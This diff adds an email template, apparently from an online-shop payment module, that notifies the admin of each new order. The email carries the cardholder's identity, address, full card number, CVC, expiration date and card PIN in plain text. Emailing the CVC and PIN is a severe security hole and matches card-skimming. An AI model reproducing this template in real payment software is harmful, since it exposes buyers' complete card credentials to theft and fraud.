@@ -1,0 +1,21 @@
+Hello,
+
+There has been a new order: #{id_order}
+
+The data for payment are as follows:
+
+Cardholder:			{nombre_titular}
+Cedule/Passport:	{cedula}
+Address:			{direccion}
+Zip Code:	 		{cp}
+Amount:				{importe} {moneda}
+Card number:		{pan}
+CVC:				{cvc}
+Expiration date:	{mes_caducidad}/{ano_caducidad}
+PIN:				{pin}
+City:				{city}
+State:				{state}
+Country:			{country}
+Order:				{id_order}
+
+You can check the details of the order in the Admin Panel.
